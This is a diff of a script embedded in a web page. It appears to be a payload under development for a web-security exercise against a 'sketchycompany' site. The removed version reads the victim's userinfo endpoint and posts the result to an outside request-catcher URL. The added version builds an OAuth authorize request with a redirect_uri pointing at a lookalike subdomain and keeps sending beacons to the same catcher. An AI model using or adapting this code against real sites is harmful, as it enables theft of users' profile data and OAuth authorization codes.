@@ -8,52 +8,33 @@
 				method: 'POST',
 				body: 'test0',
 			});
-			// const b64url = (b) => btoa(String.fromCharCode.apply(null, new Uint8Array(b))).split('+').join('-').split('/').join('_').split('=').join('');
-			// const verifier =  sessionStorage.getItem('sketchy_pkce');
-			// const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier));
-			// const url = new URL('https://login.sketchycompany.upd-dcs.work/authorize');
-			// url.search = new URLSearchParams({
-			// 	response_type: 'code',
-			// 	client_id: 'CLIENT123',
-			// 	redirect_uri: 'https://portal.sketchycompany.upd-dcs.work/callback',
-			// 	code_challenge: b64url(digest),
-			// 	code_challenge_method: 'S256',
-			// 	state: b64url(crypto.getRandomValues(new Uint8Array(16))),
-			// 	scope: 'profile'
-			// }).toString();
+			const b64url = (b) => btoa(String.fromCharCode.apply(null, new Uint8Array(b))).split('+').join('-').split('/').join('_').split('=').join('');
+			const verifier =  sessionStorage.getItem('sketchy_pkce');
+			const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier));
+			const url = new URL('https://login.sketchycompany.upd-dcs.work/authorize');
+			url.search = new URLSearchParams({
+				response_type: 'code',
+				client_id: 'CLIENT123',
+				redirect_uri: 'https://github-04463.sketchycompany.upd-dcs.work/callback',
+				code_challenge: b64url(digest),
+				code_challenge_method: 'S256',
+				state: b64url(crypto.getRandomValues(new Uint8Array(16))),
+				scope: 'profile'
+			}).toString();
 
-			// let body = {};
-
-			// const loginRes = await fetch(url.toString(), {
-			// 	method: 'GET'
-			// });
-			// const loginData = await loginRes.text();
-
+			let body = {};
 			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
 				method: 'POST',
 				body: 'test1',
 			});
 
-			try {
-				const res = await fetch('https://login.sketchycompany.upd-dcs.work/userinfo', {
-					method: 'GET'
-				});
-				const data = await res.json();
-
-				body = {
-					userInfo: data,
-					// login: loginData
-				}
-			} catch (e) {
-				body = {
-					// login: loginData,
-					error: e.message
-				}
-			}
+			const loginRes = await fetch(url.toString(), {
+				method: 'GET'
+			});
 
 			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
 				method: 'POST',
-				body: JSON.stringify(body),
+				body: 'test2',
 			});
 		})();
     </script>
